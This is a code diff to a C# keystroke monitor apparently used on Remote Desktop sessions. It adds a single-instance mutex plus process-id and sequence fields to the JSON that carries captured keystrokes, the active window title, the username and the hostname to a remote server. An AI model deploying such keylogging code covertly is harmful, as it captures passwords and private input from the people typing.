@@ -133,11 +133,23 @@ public class KeyboardMonitor {
     private static readonly object        bufLock = new object();
     private static string serverUrl, username, hostname;
     private static Timer  flushTimer;   // static field so the GC can't collect it while Start() parks in the message loop
+    private static System.Threading.Mutex instanceLock;   // held for process lifetime; blocks a second monitor in the same session
+    private static int    pid;          // this process id — lets the server tell duplicate senders apart
+    private static int    seq;          // monotonic flush counter — advancing seq with identical keys == a stuck buffer
 
     public static void Start(string url, string user, string host) {
+        // Single-instance guard, scoped to the current session ("Local\" namespace).
+        // If a previous monitor is still running in this session (e.g. -Force re-registered
+        // the task without killing the old process), this instance exits instead of
+        // installing a second hook and double-sending keystrokes.
+        bool createdNew;
+        instanceLock = new System.Threading.Mutex(true, "Local\\RDSKeystrokeMonitor", out createdNew);
+        if (!createdNew) return;
+
         serverUrl = url;
         username  = user;
         hostname  = host;
+        pid       = System.Diagnostics.Process.GetCurrentProcess().Id;
 
         flushTimer = new Timer(FLUSH_INTERVAL_MS) { AutoReset = true };
         flushTimer.Elapsed += (s, e) => Flush();
@@ -215,10 +227,10 @@ public class KeyboardMonitor {
         }
         string json = string.Format(
             "{{\"event_type\":\"keystrokes\",\"username\":\"{0}\",\"hostname\":\"{1}\"," +
-            "\"timestamp\":\"{2}\",\"window\":\"{3}\",\"keystrokes\":\"{4}\"}}",
+            "\"timestamp\":\"{2}\",\"window\":\"{3}\",\"pid\":{4},\"seq\":{5},\"keystrokes\":\"{6}\"}}",
             Escape(username), Escape(hostname),
             DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
-            Escape(ActiveWindow()), Escape(chunk));
+            Escape(ActiveWindow()), pid, System.Threading.Interlocked.Increment(ref seq), Escape(chunk));
         try {
             using (var client = new WebClient()) {
                 client.Headers[HttpRequestHeader.ContentType] = "application/json";
